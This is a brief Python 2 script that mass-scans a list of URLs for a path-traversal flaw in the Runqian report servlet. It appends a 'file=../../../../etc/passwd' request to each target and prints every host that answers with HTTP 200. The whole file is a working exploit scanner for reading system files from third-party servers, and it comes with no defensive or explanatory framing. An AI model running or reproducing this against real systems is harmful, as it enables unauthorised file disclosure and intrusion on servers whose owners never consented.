# -*- coding: cp936 -*-
import requests

headers={'Content-Type':'application/x-www-form-urlencoded'}
def check(url):
    try:
        rep1=requests.get(url,headers=headers,allow_redirects=False,timeout=1)
        if rep1.status_code==200:
            print url+'      yes'
    except Exception,e:
        pass
test=0
with open('hello_world.txt','r') as f:
    for i in f.readlines():
        test+=1
        print test
        url=i.strip('\n')
        test_url_1=url+'/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../../etc/passwd'
        check(test_url_1)
